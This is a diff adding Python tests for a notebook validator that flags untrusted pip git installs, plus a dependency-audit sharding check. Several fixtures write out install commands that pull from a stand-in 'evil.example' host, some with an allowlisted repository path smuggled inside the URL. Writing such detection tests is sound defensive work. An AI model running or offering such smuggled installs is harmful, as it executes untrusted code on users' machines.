@@ -380,6 +380,16 @@ def test_security_audit_covers_every_installable_torchcodec_line():
         assert f"audit-reqs/{extra}.txt" in text, extra
         assert f" {extra} " in text or f" {extra};" in text or f" {extra}'" in text, extra
 
+    # scan_packages.py keeps one requirement per package name, so two disjoint torchcodec
+    # ranges in one shard collapse to the first. They have to be scanned apart.
+    shards = re.findall(r"files: '([^']+)'", text)
+    for shard in shards:
+        assert (
+            sum(1 for extra in audited if extra in shard.split()) <= 1
+        ), f"shard {shard!r} would have its torchcodec lines deduplicated to one"
+    scanned = {extra for shard in shards for extra in audited if extra in shard.split()}
+    assert scanned == {"audio-torch210", "audio-torch290", "audio-torch280"}
+
     # Whatever the selector installs on a reachable torch minor has to be in that set.
     for torch_minor in ("2.10", "2.9", "2.8"):
         spec = ips._select_torchcodec_spec(f"{torch_minor}.0")
@@ -1079,6 +1089,83 @@ def test_notebook_validator_reads_a_named_direct_reference():
         )
         == 1
     )
+
+
+def test_git_allowlist_matches_the_repository_not_a_substring():
+    """An arbitrary repository can carry an allowlisted path inside its own, so the allowlist
+    is compared against the normalised host and path."""
+    nv = _load_notebook_validator_module()
+
+    assert nv._git_source_repository(
+        "git+https://user:pw@github.com/state-spaces/mamba.git@v2.0"
+    ) == "github.com/state-spaces/mamba"
+    assert nv._git_source_is_allowed("git+https://github.com/unslothai/unsloth-zoo.git")
+    assert not nv._git_source_is_allowed(
+        "git+https://evil.example/repo/github.com/unslothai/unsloth.git"
+    )
+
+    smuggled = "!pip install git+https://evil.example/repo/github.com/unslothai/unsloth.git"
+    assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(smuggled, "nb.ipynb", 0))
+
+    # Credentials and a trailing ref do not stop an allowlisted repository from matching.
+    assert nv.rule_inst_001_git_plus(
+        "!pip install git+https://user:pw@github.com/state-spaces/mamba.git@v2.0", "nb.ipynb", 0
+    ) == []
+
+
+def test_git_ban_reads_commands_not_the_comment():
+    """`_split_chained` drops a shell comment, so a comment naming a prohibited source is
+    documentation and must not fail the notebook."""
+    nv = _load_notebook_validator_module()
+
+    assert nv.rule_inst_001_git_plus(
+        "!pip install foo # avoid git+https://example.com/evil.git", "nb.ipynb", 0
+    ) == []
+    # The executable half of the same line still counts.
+    assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(
+        "!pip install git+https://example.com/evil.git # needed", "nb.ipynb", 0
+    ))
+
+
+def test_notebook_validator_ends_a_grouped_and_or_list_at_its_own_operator():
+    """Which list an operator belongs to is its group depth. `(A || B && C)` is one list, so
+    the `&&` ends the tail; `A || (B && C)` is not, so it does not."""
+    nv = _load_notebook_validator_module()
+
+    same_list = '!(pip install foo || pip install bar && pip install "torch==2.12.0")'
+    assert [flag for _, flag in nv._split_chained(same_list)] == [False, True, False]
+    assert len(
+        nv.rule_inst_004_torchcodec_torch(same_list, COLAB_TORCH211, "nb.ipynb", 0)
+    ) == 1
+
+    inner = '!pip install foo || (pip install bar && pip install "torch==2.12.0")'
+    assert [flag for _, flag in nv._split_chained(inner)] == [False, True, True]
+    assert nv.rule_inst_004_torchcodec_torch(inner, COLAB_TORCH211, "nb.ipynb", 0) == []
+
+
+def test_notebook_validator_keeps_a_minor_a_narrow_exclusion_cannot_remove():
+    """`>=0.11,<0.12,!=0.11.0` still lands in the 0.11 line, and the minor is what the rule
+    compares. Only a wildcard over the whole minor takes it away."""
+    nv = _load_notebook_validator_module()
+
+    assert nv._exclusion_covers_minor("0.11", "0.11.*")
+    assert not nv._exclusion_covers_minor("0.11", "0.11.0")
+    assert not nv._exclusion_covers_minor("0.11", "0.11.1.*")
+
+    older = {"torch": "2.10.0+cu128", "torchcodec": "0.10.0"}
+    for cell in (
+        '!pip install "torchcodec>=0.11,<0.12,!=0.11.0"',
+        '!pip install "torchcodec>=0.11,<=0.11.1,!=0.11"',
+    ):
+        assert len(
+            nv.rule_inst_004_torchcodec_torch(cell, older, "nb.ipynb", 0)
+        ) == 1, cell
+
+    # A wildcard over the minor still clears it.
+    newer = {"torch": "2.10.0+cu128", "torchcodec": "0.15.0"}
+    assert nv.rule_inst_004_torchcodec_torch(
+        '!pip install "torchcodec>=0.10,<0.12,!=0.11.*"', newer, "nb.ipynb", 0
+    ) == []
 
 
 def test_notebook_validator_reads_a_range_as_one_window():
